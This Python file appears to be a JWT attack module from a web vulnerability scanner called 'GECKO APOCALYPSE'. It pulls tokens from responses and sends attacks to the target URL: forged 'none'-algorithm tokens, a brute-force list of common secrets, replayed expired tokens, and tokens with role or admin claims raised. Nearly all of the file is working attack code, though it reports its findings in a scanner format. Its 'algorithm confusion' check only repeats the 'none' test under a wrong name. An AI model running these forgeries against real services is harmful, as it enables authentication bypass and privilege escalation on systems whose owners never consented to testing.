"""GECKO APOCALYPSE - JWT Manipulator"""
import asyncio, aiohttp, re, json, base64
from typing import List, Dict, Optional

try:
    import jwt
except ImportError:
    jwt = None

class JWTManipulator:
    def __init__(self, session, config, db):
        self.session = session; self.config = config; self.db = db
        self.weak_secrets = ['secret','password','123456','admin','jwt','key','test','changeme',
                             'supersecret','default','qwerty','letmein','welcome','monkey']

    async def scan(self, url, content, headers, response):
        if not jwt: return []
        findings = []
        for token in self._extract(content, headers):
            for t in [self._alg_confusion, self._none_alg, self._weak_secret, self._expired, self._claim_manip]:
                r = await t(url, token)
                if r: findings.append(r) if isinstance(r, dict) else findings.extend(r)
        return findings

    def _extract(self, content, headers):
        tokens = set()
        auth = headers.get('authorization','') or headers.get('Authorization','')
        if 'Bearer' in auth: tokens.add(auth.split('Bearer ')[-1].strip())
        pat = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        tokens.update(re.findall(pat, headers.get('set-cookie','')))
        tokens.update(re.findall(pat, content))
        return list(tokens)

    async def _alg_confusion(self, url, token):
        try:
            dec = jwt.decode(token, options={"verify_signature":False})
            mod = jwt.encode(dec, '', algorithm='none')
            async with self.session.get(url, headers={'Authorization':f'Bearer {mod}'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    return {'type':'JWT Algorithm Confusion','severity':'CRITICAL','url':url,
                            'evidence':'Server accepted token with none algorithm','cwe':'CWE-327','owasp':'A02:2021',
                            'remediation':'Strictly validate JWT algorithm in backend'}
        except: pass

    async def _none_alg(self, url, token):
        try:
            dec = jwt.decode(token, options={"verify_signature":False})
            h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
            p = base64.urlsafe_b64encode(json.dumps(dec).encode()).decode().rstrip('=')
            mod = f"{h}.{p}."
            async with self.session.get(url, headers={'Authorization':f'Bearer {mod}'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    return {'type':'JWT None Algorithm Accepted','severity':'CRITICAL','url':url,
                            'evidence':'Server accepted unsigned JWT','cwe':'CWE-345'}
        except: pass

    async def _weak_secret(self, url, token):
        try:
            for s in self.weak_secrets:
                try:
                    jwt.decode(token, s, algorithms=['HS256','HS384','HS512'])
                    return {'type':'JWT Weak Secret','severity':'CRITICAL','url':url,
                            'evidence':f"JWT secret cracked: '{s}'",'cwe':'CWE-521'}
                except jwt.InvalidSignatureError: continue
                except: continue
        except: pass

    async def _expired(self, url, token):
        try:
            dec = jwt.decode(token, options={"verify_signature":False,"verify_exp":False})
            if 'exp' in dec:
                import time
                if dec['exp'] < time.time():
                    async with self.session.get(url, headers={'Authorization':f'Bearer {token}'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        if r.status == 200:
                            return {'type':'JWT Expired Token Accepted','severity':'HIGH','url':url,
                                    'evidence':'Server accepts expired JWT tokens','cwe':'CWE-613'}
        except: pass

    async def _claim_manip(self, url, token):
        findings = []
        try:
            dec = jwt.decode(token, options={"verify_signature":False})
            for claim in ['role','admin','isAdmin','permissions','scope','user_type']:
                if claim in dec:
                    mod = dec.copy()
                    mod[claim] = 'admin' if isinstance(dec[claim], str) else True
                    h = base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).decode().rstrip('=')
                    p = base64.urlsafe_b64encode(json.dumps(mod).encode()).decode().rstrip('=')
                    async with self.session.get(url, headers={'Authorization':f'Bearer {h}.{p}.'}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        if r.status == 200:
                            findings.append({'type':'JWT Privilege Escalation','severity':'CRITICAL','url':url,
                                            'evidence':f"Modified claim '{claim}'",'cwe':'CWE-269'})
        except: pass
        return findings
